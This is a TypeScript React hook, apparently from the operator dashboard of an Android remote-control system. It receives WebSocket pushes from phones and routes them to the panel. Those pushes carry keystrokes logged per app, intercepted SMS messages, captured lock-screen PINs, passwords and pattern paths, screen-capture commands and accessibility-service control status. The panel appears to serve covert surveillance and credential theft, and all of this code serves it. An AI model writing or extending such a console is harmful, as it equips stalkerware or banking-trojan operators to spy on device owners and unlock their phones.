import { useCallback, useEffect, useRef, useState } from "react";
import { getAdminToken } from "../auth/session";
import type {
  AdminPushMessage,
  AdminSnapshotMessage,
  A11yProbe,
  Device,
  KeyguardPinRecord,
  LogEntry,
} from "../types";
interface UseAdminWebSocketOptions {
  onSnapshot?: (devices: Device[], onlineDeviceIds: string[]) => void;
  onLog?: (entry: LogEntry) => void;
  onDeviceOnline?: (deviceId: string) => void;
  onDeviceOffline?: (deviceId: string) => void;
  onKeyguardPin?: (deviceId: string, record: KeyguardPinRecord) => void;
  /**
   * 无障碍「实际连接」更新，两个来源共用：
   * - `a11y_probe` 推送：服务端探针结果（旧版客户端、或心跳停更后的补探）
   * - `heartbeat` 推送：新版客户端随 30s 心跳带上来的值
   * 收到后直接覆盖列表行，列表就不需要为这一个字段轮询。
   */
  onA11yProbe?: (deviceId: string, probe: A11yProbe) => void;
  showHeartbeat?: boolean;
}

function buildLogFromPush(message: AdminPushMessage, showHeartbeat: boolean): LogEntry | null {
  if (message.type === "heartbeat" && !showHeartbeat) {
    return null;
  }

  const base = {
    id: `${message.type}-${message.deviceId}-${message.timestamp}`,
    deviceId: message.deviceId,
    timestamp: message.timestamp,
  };

  switch (message.type) {
    case "device_online":
      return {
        ...base,
        kind: "system",
        title: "设备上线",
        content: JSON.stringify(message.payload ?? {}, null, 0),
      };
    case "device_offline":
      return {
        ...base,
        kind: "system",
        title: "设备离线",
        content: message.deviceId,
      };
    case "device_registered":
      return {
        ...base,
        kind: "system",
        title: "设备注册",
        content: JSON.stringify(message.payload ?? {}, null, 0),
      };
    case "heartbeat":
      return {
        ...base,
        kind: "system",
        title: "心跳",
        content: JSON.stringify(message.payload ?? {}, null, 0),
      };
    case "command_sent": {
      const cmd = String(message.payload?.cmd ?? "");
      if (
        cmd === "get_screen" ||
        cmd === "capture_screenshot" ||
        cmd === "ping"
      ) {
        return null;
      }
      return {
        ...base,
        kind: "command",
        title: "指令已下发",
        content: JSON.stringify(message.payload ?? {}, null, 0),
      };
    }
    case "command_result": {
      const data = message.payload?.data as Record<string, unknown> | null;
      // ephemeral（get_screen / capture_screenshot）回执不入活动日志。
      const cmd = String(message.payload?.cmd ?? "");
      if (cmd === "get_screen" || cmd === "capture_screenshot" || cmd === "ping") {
        return null;
      }
      if (message.payload?.ephemeral === true) {
        return null;
      }
      if (data && typeof data.data === "string") {
        return null;
      }
      return {
        ...base,
        kind: "command",
        title: "指令回执",
        content: JSON.stringify(message.payload ?? {}, null, 0),
      };
    }
    case "keyboard":
      return {
        ...base,
        kind: "keyboard",
        title: String(message.payload?.appPackage ?? "unknown.app"),
        content: String(message.payload?.text ?? ""),
      };
    case "sms":
      return {
        ...base,
        kind: "sms",
        title: String(message.payload?.sender ?? "unknown"),
        content: String(message.payload?.body ?? ""),
      };
    default:
      return null;
  }
}

export function useAdminWebSocket(options: UseAdminWebSocketOptions) {
  const [connected, setConnected] = useState(false);
  const optionsRef = useRef(options);
  const socketRef = useRef<WebSocket | null>(null);
  optionsRef.current = options;

  const send = useCallback((message: Record<string, unknown>) => {
    if (socketRef.current?.readyState === WebSocket.OPEN) {
      socketRef.current.send(JSON.stringify(message));
    }
  }, []);

  useEffect(() => {
    let socket: WebSocket | null = null;
    let retryTimer: number | null = null;
    let disposed = false;

    function connect() {
      const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
      const token = getAdminToken();
      const query = token ? `?token=${encodeURIComponent(token)}` : "";
      socket = new WebSocket(`${protocol}//${window.location.host}/ws/admin${query}`);
      socketRef.current = socket;

      socket.onopen = () => {
        if (disposed) {
          return;
        }
        setConnected(true);
      };

      socket.onclose = () => {
        setConnected(false);
        socketRef.current = null;
        if (!disposed) {
          retryTimer = window.setTimeout(connect, 3000);
        }
      };

      socket.onerror = () => {
        setConnected(false);
      };

      socket.onmessage = (event) => {
        const message = JSON.parse(event.data) as AdminSnapshotMessage | AdminPushMessage;

        if (message.type === "snapshot") {
          optionsRef.current.onSnapshot?.(
            message.payload.devices,
            message.payload.onlineDeviceIds,
          );
          return;
        }

        const push = message as AdminPushMessage;
        if (push.type === "device_online") {
          optionsRef.current.onDeviceOnline?.(push.deviceId);
        }
        if (push.type === "device_offline") {
          optionsRef.current.onDeviceOffline?.(push.deviceId);
        }
        if (push.type === "a11y_probe" && push.payload) {
          optionsRef.current.onA11yProbe?.(push.deviceId, {
            serviceConnected:
              typeof push.payload.serviceConnected === "boolean"
                ? push.payload.serviceConnected
                : null,
            controlReady:
              typeof push.payload.controlReady === "boolean"
                ? push.payload.controlReady
                : null,
            probedAt: Number(push.payload.probedAt ?? push.timestamp) || push.timestamp,
            error:
              typeof push.payload.error === "string" && push.payload.error
                ? push.payload.error
                : null,
            // 这条推送只可能来自服务端探针；心跳走的是下面的 heartbeat 分支。
            source: "probe",
          });
        }
        if (push.type === "heartbeat" && push.payload) {
          // 新版客户端随心跳带无障碍「实际连接」；旧版没有这两个字段，
          // 此时不能拿心跳去覆盖已有的探针值。
          const connected = push.payload.accessibilityConnected;
          const control = push.payload.controlReady;
          if (typeof connected === "boolean" || typeof control === "boolean") {
            optionsRef.current.onA11yProbe?.(push.deviceId, {
              serviceConnected: typeof connected === "boolean" ? connected : null,
              controlReady: typeof control === "boolean" ? control : null,
              probedAt: push.timestamp,
              error: null,
              source: "heartbeat",
            });
          }
        }
        if (push.type === "keyguard_pin" && push.payload) {
          const pin = String(push.payload.pin ?? "");
          if (pin) {
            const lockTypeRaw = String(push.payload.lockType ?? "pin").toLowerCase();
            const lockType =
              lockTypeRaw === "password" || lockTypeRaw === "pattern" ? lockTypeRaw : "pin";
            optionsRef.current.onKeyguardPin?.(push.deviceId, {
              deviceId: push.deviceId,
              pin,
              digitCount: Number(push.payload.digitCount ?? pin.length),
              lockType,
              gesturePath: String(push.payload.gesturePath ?? ""),
              capturedAt: String(push.payload.capturedAt ?? new Date(push.timestamp).toISOString()),
              updatedAt: String(push.payload.updatedAt ?? new Date(push.timestamp).toISOString()),
            });
          }
        }

        const log = buildLogFromPush(
          push,
          optionsRef.current.showHeartbeat ?? false,
        );
        if (log) {
          optionsRef.current.onLog?.(log);
        }
      };
    }

    connect();

    return () => {
      disposed = true;
      if (retryTimer) {
        window.clearTimeout(retryTimer);
      }
      socket?.close();
      socketRef.current = null;
    };
  }, [send]);

  return { connected, send };
}
